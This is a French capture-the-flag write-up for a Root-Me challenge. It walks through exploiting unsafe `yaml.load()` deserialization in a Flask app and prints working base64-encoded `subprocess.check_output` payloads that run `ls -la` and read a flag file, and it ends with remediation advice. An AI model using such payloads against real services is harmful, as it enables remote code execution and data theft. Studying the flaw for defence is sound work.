# Root-Me — YAML Deserialization — Writeup

**Catégorie :** Web‑Serveur · **Points :** 35 · **Auteur :** Nishacid · **Cible :** `challenge01.root-me.org:59071`

**En bref :** l'application Flask décode en base64 le segment d'URL, le passe à `yaml.load()` **sans Loader** (donc désérialisation non sûre), puis renvoie `content['yaml']`. On injecte un objet `!!python/object/apply:subprocess.check_output` sous une clé `yaml:` pour obtenir une RCE et lire le flag.

---

## 1. Reconnaissance

Le serveur se présente comme `Werkzeug/1.0.1 Python/3.8.10` → application **Flask**. La page affiche un thème « Coming Soon » et, en cas d'erreur, le message `Unable to deserialize the object`. La racine `/` renvoie une **redirection 302** vers un chemin base64 :

```
eWFtbDogV2UgYXJlIGN1cnJlbnRseSBpbml0aWFsaXppbmcgb3VyIG5ldyBzaXRlICEg
= "yaml: We are currently initializing our new site ! "
```

Indice capital : le contenu légitime est un **mapping YAML avec une clé `yaml:`**. C'est le format attendu.

---

## 2. Le code source

```python
@app.route("/")
def start():
    return redirect("/eWFtbDog...", code=302)      # page d'accueil = un YAML "yaml: ..."

@app.route("/<input>", methods=['GET'])            # (1) vecteur = GET, dans le PATH
def deserialization(input):
    try:
        if not input:
            return render_template("/index.html")
        yaml_file = base64.b64decode(input)        # (2) base64 décodé
        content = yaml.load(yaml_file)             # (3) load SANS Loader → NON SÛR
        return render_template("index.html", content=content['yaml'])  # (4) clé 'yaml' + reflet
    except:
        content = "Unable to deserialize the object"   # (5) bare except → message générique
        return render_template("index.html", content=content)
```

Chaque ligne explique un comportement observé :

| Ligne | Conséquence |
|---|---|
| (1) `@app.route("/<input>")`, `GET` | L'entrée est dans le **path**, en **GET**. Pas de paramètre, pas de POST. |
| (2) `b64decode` | Le payload doit être du **base64**. |
| (3) `yaml.load` sans `Loader=` | Désérialisation **non sûre** → les tags `!!python/object/...` s'exécutent. |
| (4) `content['yaml']` | Le résultat **doit être un dict avec la clé `yaml`**, sinon exception. Et sa valeur est **réfléchie** dans la page. |
| (5) `except:` nu | **N'importe quelle** erreur → le même message. D'où l'impossibilité de distinguer les échecs. |

---

## 3. La vulnérabilité : désérialisation YAML non sûre

`yaml.load(data)` **sans préciser de `Loader`** reconstruit des objets Python arbitraires via des tags comme `!!python/object/apply:<callable>`, qui **appellent** le callable avec les arguments fournis. Fournir `subprocess.check_output` revient donc à exécuter une commande système → **RCE**.

### Rappel : les loaders PyYAML

| API | Comportement | Côté offensif |
|---|---|---|
| `safe_load` / `SafeLoader` | Types YAML standard uniquement | Pas d'objets Python |
| `full_load` / `FullLoader` | Rejette les tags objets (PyYAML moderne) | Bypass `python/object/new` sur < 5.4 (CVE‑2020‑1747 / 14343) |
| `load` sans Loader, `unsafe_load`, `Loader`, `UnsafeLoader` | Reconstruit objets **et fonctions** | **Sink RCE direct** |

Depuis PyYAML **5.1**, `yaml.load(data)` sans Loader émet un warning et utilise FullLoader (qui bloquerait `subprocess`). Or ici `apply:subprocess.check_output` **fonctionne** → le serveur tourne sur **PyYAML < 5.1**, où `load` ≡ désérialisation non sûre.

---

## 4. Les trois conditions à réunir

1. **Verbe GET**, base64 dans le **path** : `GET /<base64> HTTP/1.1`
2. Payload **base64** d'un document YAML
3. Document = mapping avec clé de premier niveau **`yaml:`** (sinon `content['yaml']` lève une exception)

C'est le point n°3 qui faisait échouer tous les premiers essais : un objet au premier niveau (`!!python/object/...` seul) donne un `content` qui n'est pas un dict indexable par `'yaml'` → exception → `Unable to deserialize the object`.

---

## 5. Exploitation

**Contrôle bénin** (valide le vecteur et la clé) — `yaml: !!python/object/apply:builtins.range [1, 5, 1]` :

```
GET /eWFtbDogISFweXRob24vb2JqZWN0L2FwcGx5OmJ1aWx0aW5zLnJhbmdlIFsxLCA1LCAxXQ== HTTP/1.1
Host: challenge01.root-me.org:59071
```

**RCE — reconnaissance** — `yaml: !!python/object/apply:subprocess.check_output [["ls", "-la"]]` :

```
GET /eWFtbDogISFweXRob24vb2JqZWN0L2FwcGx5OnN1YnByb2Nlc3MuY2hlY2tfb3V0cHV0IFtbImxzIiwgIi1sYSJdXQ== HTTP/1.1
Host: challenge01.root-me.org:59071
```

Encoder n'importe quelle commande :

```bash
printf '%s' 'yaml: !!python/object/apply:subprocess.check_output [["cat", "flag.txt"]]' | base64 -w0
```

---

## 6. Le point clé : `check_output` vs `Popen`

La page affiche `content['yaml']`, c'est‑à‑dire le **`repr`/`str` de l'objet renvoyé** :

- `subprocess.check_output([...])` **retourne** la sortie (bytes) → tu **la vois**.
- `subprocess.Popen(...)` retourne un **objet `Popen`** → tu vois `<subprocess.Popen object at 0x7f...>`. La commande s'exécute bien, mais sa sortie part sur le vrai stdout du serveur, pas dans l'objet renvoyé.

Règle : `check_output` (ou `os.popen(...).read()`) pour **lire** un résultat ; `Popen` seulement quand lancer la commande suffit (ex. reverse shell).

---

## 7. Récupération du flag

Après un `ls -la`, on repère le fichier et on le lit :

```
yaml: !!python/object/apply:subprocess.check_output [["cat", "<fichier_du_flag>"]]
```

Note : `check_output` lève une exception sur code de retour **non nul** (fichier absent, droits) → tu retomberais sur `Unable to deserialize`. Vérifie le chemin avec un `ls -la` ciblé d'abord.

---

## 8. Journal de debug (les leçons)

- **POST / `?param`** : fausses pistes — la route est `@app.route("/<input>")` en GET, l'entrée est dans le path.
- **Théorie « filtre mots‑clés »** puis **« loader safe »** : toutes deux fausses. Le vrai coupable était `content['yaml']` + le `except:` nu, qui transformaient *toute* erreur (KeyError, TypeError, ConstructorError…) en un message identique.
- **Méthode** : quand un payload bénin et un payload malveillant donnent le **même** résultat, ce n'est pas la gadget qu'il faut changer — il faut d'abord **isoler le vecteur** avec un payload de contrôle, puis seulement travailler la charge utile.

---

## 9. Remédiation

- Utiliser `yaml.safe_load()` (jamais `load()` sur des données non fiables).
- Valider la structure attendue après coup, et ne jamais désérialiser d'entrée contrôlée par l'utilisateur en objets.
- Ne pas masquer toutes les exceptions derrière un `except:` nu (ça cache les vrais bugs sans protéger de l'attaque).

---

## 10. Références

- PyYAML — documentation `load` / loaders
- HackTricks — *Python YAML Deserialization*
- CVE‑2020‑1747 et CVE‑2020‑14343 (bypass FullLoader < 5.4)
- ExploitDB 47655 — *YAML deserialization attack in Python*
